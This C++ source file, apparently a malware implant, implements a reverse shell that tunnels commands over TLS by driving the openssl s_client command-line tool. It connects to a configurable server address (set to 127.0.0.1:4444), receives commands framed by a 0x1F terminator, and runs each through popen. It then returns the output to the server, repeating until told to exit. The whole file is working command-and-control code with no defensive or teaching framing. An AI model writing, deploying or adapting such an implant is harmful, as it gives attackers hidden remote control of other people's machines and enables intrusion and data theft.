// agent.cpp – TLS agent using the openssl command-line tool.
// Compile:
//   g++ -std=c++17 -o agent agent.cpp
// Requires: openssl CLI (apt install openssl)

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <unistd.h>
#include <signal.h>
#include <sys/wait.h>

// ── Macros ─────────────────────────────────────────────────────────
#define SERVER_IP   "127.0.0.1"
#define SERVER_PORT 4444
// ───────────────────────────────────────────────────────────────────

#define TERMINATOR      "\x1f\x1f\x1f\x1f\x1f"
#define TERMINATOR_LEN  5
#define BUF_SZ          4096

// ── TLS connection via openssl s_client ────────────────────────────

struct TLSConn {
    pid_t pid;
    int   write_fd;   // we write to openssl's stdin
    int   read_fd;    // we read from openssl's stdout
};

// Opens a fresh TLS connection by spawning openssl s_client.
static TLSConn *tls_connect()
{
    int pipe_in[2];   // parent writes → child stdin
    int pipe_out[2];  // child stdout → parent reads

    if (pipe(pipe_in) < 0 || pipe(pipe_out) < 0) {
        perror("pipe");
        return nullptr;
    }

    pid_t pid = fork();
    if (pid < 0) {
        perror("fork");
        return nullptr;
    }

    if (pid == 0) {
        // ── child ──────────────────────────────────────────────
        close(pipe_in[1]);   // close write end of input pipe
        close(pipe_out[0]);  // close read end of output pipe

        dup2(pipe_in[0],  STDIN_FILENO);
        dup2(pipe_out[1], STDOUT_FILENO);
        // dup2(pipe_out[1], STDERR_FILENO);

        close(pipe_in[0]);
        close(pipe_out[1]);

        // Build connect string "IP:PORT"
        char connect_arg[256];
        snprintf(connect_arg, sizeof(connect_arg), "%s:%d", SERVER_IP, SERVER_PORT);

        execlp("openssl", "openssl", "s_client",
               "-connect", connect_arg,
               "-quiet",       // suppress session info
               nullptr);

        perror("execlp");
        _exit(1);
    }

    // ── parent ─────────────────────────────────────────────────
    close(pipe_in[0]);
    close(pipe_out[1]);

    TLSConn *conn = new TLSConn;
    conn->pid      = pid;
    conn->write_fd = pipe_in[1];
    conn->read_fd  = pipe_out[0];
    return conn;
}

static void tls_close(TLSConn *conn)
{
    if (!conn) return;
    close(conn->write_fd);
    close(conn->read_fd);
    kill(conn->pid, SIGTERM);
    waitpid(conn->pid, nullptr, 0);
    delete conn;
}

// ── Framed send / recv ─────────────────────────────────────────────

// Appends 5×0x1F terminator automatically.
static void send_msg(TLSConn *conn, const std::string &msg)
{
    std::string frame = msg + TERMINATOR;
    const char *p = frame.data();
    size_t left = frame.size();
    while (left > 0) {
        ssize_t n = write(conn->write_fd, p, left);
        if (n <= 0) break;
        p    += n;
        left -= n;
    }
}

// Reads until the 5×0x1F terminator; returns stripped payload.
static std::string recv_msg(TLSConn *conn)
{
    std::string buf;
    char tmp[BUF_SZ];
    const std::string term(TERMINATOR, TERMINATOR_LEN);

    for (;;) {
        ssize_t n = read(conn->read_fd, tmp, sizeof(tmp));
        if (n <= 0) return {};
        buf.append(tmp, n);
        auto pos = buf.find(term);
        if (pos != std::string::npos)
            return buf.substr(0, pos);
    }
}

// ── Shell helper ───────────────────────────────────────────────────

static std::string exec_cmd(const std::string &cmd)
{
    std::string out;
    FILE *fp = popen((cmd + " 2>&1").c_str(), "r");
    if (!fp) return "popen() failed\n";

    char line[512];
    while (std::fgets(line, sizeof(line), fp))
        out += line;
    pclose(fp);

    if (out.empty()) out = "(no output)\n";
    return out;
}

// ── Main loop ──────────────────────────────────────────────────────

int main()
{
    signal(SIGPIPE, SIG_IGN);   // ignore broken-pipe signals

    std::string payload = "READY";

    for (;;) {
        TLSConn *conn = tls_connect();
        if (!conn) {
            sleep(2);
            continue;
        }

        // Small delay to let TLS handshake finish inside openssl s_client
        usleep(300000);

        send_msg(conn, payload);           // send output (or READY)
        std::string cmd = recv_msg(conn);  // receive next command
        tls_close(conn);

        if (cmd.empty() || cmd == "exit")
            break;
        printf("Executing %s", cmd.c_str());
        payload = exec_cmd(cmd);           // execute & store result
    }

    return 0;
}